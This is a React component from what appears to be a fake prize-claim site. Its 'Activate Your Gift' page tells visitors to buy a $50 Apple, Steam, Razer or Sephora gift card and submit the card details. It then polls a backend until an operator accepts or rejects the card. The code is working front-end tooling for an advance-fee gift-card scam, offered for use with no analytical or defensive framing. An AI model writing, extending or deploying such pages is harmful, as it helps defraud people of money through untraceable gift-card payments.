import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUser } from '../../context/UserContext';
import { submitCard, getCardStatus, updateStep } from '../../services/api';
import CardInputForm from '../../components/CardInputForm';
import './ActivatePage.css';

const ActivatePage = () => {
  const { userId, user, updateUser } = useUser();
  const navigate = useNavigate();
  const [cardStatus, setCardStatus] = useState(null);
  const [reason, setReason] = useState('');
  const [submitting, setSubmitting] = useState(false);

  // Redirect guard – allow entry from confirmation step
  useEffect(() => {
    if (!userId) {
      navigate('/');
      return;
    }
    const allowedSteps = ['confirmation', 'activation', 'processing', 'verification', 'complete'];
    if (user && !allowedSteps.includes(user.step)) {
      navigate('/');
    }
  }, [userId, user, navigate]);

  // Poll card status every 5 seconds when pending
  useEffect(() => {
    if (!userId) return;

    const checkStatus = async () => {
      try {
        const res = await getCardStatus(userId, 'activation');
        setCardStatus(res.data.status);
        if (res.data.status === 'rejected') setReason(res.data.rejectionReason || '');
      } catch (err) {
        console.error(err);
      }
    };

    checkStatus(); // initial check
    const interval = setInterval(() => {
      if (cardStatus === 'pending') {
        checkStatus();
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [userId, cardStatus]); // re-run when cardStatus changes to stop polling when not pending

  const handleCardSubmit = async (cardData) => {
    setSubmitting(true);
    try {
      await submitCard(userId, cardData);
      setCardStatus('pending');
    } catch (err) {
      alert('Submission failed.');
      console.error(err);
    } finally {
      setSubmitting(false);
    }
  };

  const handleProceed = async () => {
    // Update step to 'processing' before navigating
    try {
      await updateStep(userId, 'processing');
      updateUser({ ...user, step: 'processing' });
    } catch (err) {
      console.error('Step update failed', err);
    }
    navigate('/processing');
  };

  if (!user || !user.userDetails) return <div>Loading...</div>;

  return (
    <div className="activate-page">
      <h1>Activate Your Gift</h1>
      <p>Gift: {user.giftWon?.name}</p>
      <p className="instructions">
        Kindly get a gift card of $50 to activate your gift. Purchase any of the following gift card types
        (Apple Gift Card, Steam Gift Card, Razer Gift Card, Sephora Gift Card) to activate, then input the details below.
      </p>

      {cardStatus === 'accepted' ? (
        <div>
          <p className="success-msg">Your activation card has been accepted!</p>
          <button onClick={handleProceed}>Proceed to Processing</button>
        </div>
      ) : cardStatus === 'rejected' ? (
        <div>
          <p className="error-msg">Your card was rejected: {reason}</p>
          <p>Please try again with a valid card.</p>
          <CardInputForm type="activation" onSubmit={handleCardSubmit} disabled={submitting} />
        </div>
      ) : cardStatus === 'pending' ? (
        <div>
          <p className="pending-msg">Your gift card is under verification. Please wait...</p>
          <p className="auto-update-note">This page updates automatically. No need to refresh.</p>
        </div>
      ) : (
        <CardInputForm type="activation" onSubmit={handleCardSubmit} disabled={submitting} />
      )}
    </div>
  );
};

export default ActivatePage;